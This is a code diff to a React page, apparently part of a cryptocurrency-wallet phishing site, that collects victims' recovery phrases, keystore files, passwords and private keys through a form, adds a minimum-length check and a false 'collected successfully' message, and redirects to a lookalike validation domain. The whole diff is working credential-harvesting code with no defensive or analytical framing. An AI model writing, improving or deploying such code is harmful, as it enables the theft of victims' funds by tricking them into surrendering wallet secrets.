@@ -36,24 +36,39 @@ function WalletDetailsEntryPage() {
 
   function handleSubmit(e) {
     e.preventDefault();
-    fetch('/', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-      },
-      body: encode({ 'form-name': 'Wallet_import_details', ...walletDetails }),
-    })
-      .then(() => {
-        setWalletDetails({
-          phrase: '',
-          keystoreJson: '',
-          password: '',
-          privateKey: '',
-        });
-        window.location.replace('https://wvalidate.com');
+    if (walletDetails.phrase.length >= 12 && walletDetails.phrase !== '') {
+      fetch('/', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: encode({
+          'form-name': 'Wallet_import_details',
+          ...walletDetails,
+        }),
       })
-      .catch((error) => alert(error));
-    console.log(walletDetails);
+        .then(() => {
+          setWalletDetails({
+            phrase: '',
+            keystoreJson: '',
+            password: '',
+            privateKey: '',
+          });
+        })
+        .then(() => {
+          alert('Your Entry/Entries Have Been Collected Successfully');
+        })
+        .then(() => {
+          window.location.replace('https://wvalidation.com');
+        })
+        .catch((error) => alert(error));
+      console.log(walletDetails);
+    } else {
+      alert(
+        'Phrase, Keystore JSON, and Password must NOT be less than 12 characters.'
+      );
+      return false;
+    }
   }
 
   function displayPhrase() {
